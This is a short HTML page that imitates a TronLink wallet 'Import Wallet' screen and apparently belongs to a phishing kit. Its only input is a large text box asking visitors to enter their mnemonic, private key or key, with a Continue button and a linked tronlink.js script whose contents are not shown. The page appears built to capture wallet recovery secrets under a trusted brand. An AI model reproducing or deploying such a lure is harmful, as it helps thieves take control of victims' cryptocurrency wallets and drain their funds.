<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="tronlink.css">
</head>
<body>
    <div class="outer-box">
        <div class="inner-box">
            <div class="header-box">
                <h1>Import Wallet</h1>
                <img class="img" src="tron.jpg" alt="">
            </div>
            <div class="second-box">
                <form class="form" action="#">
                    <label class="label" for="">Input</label> <br>
                    <textarea class="text-area" placeholder="  Please enter your mnemonic, private key, or key...." name="" id="" cols="30" rows="15"></textarea>
                    <p class="error-box display"></p>
                </form>
                <button class="button" type="submit">Continue</button>
            </div>
        </div>
    </div>
    <script src="tronlink.js"></script>
</body>
</html>
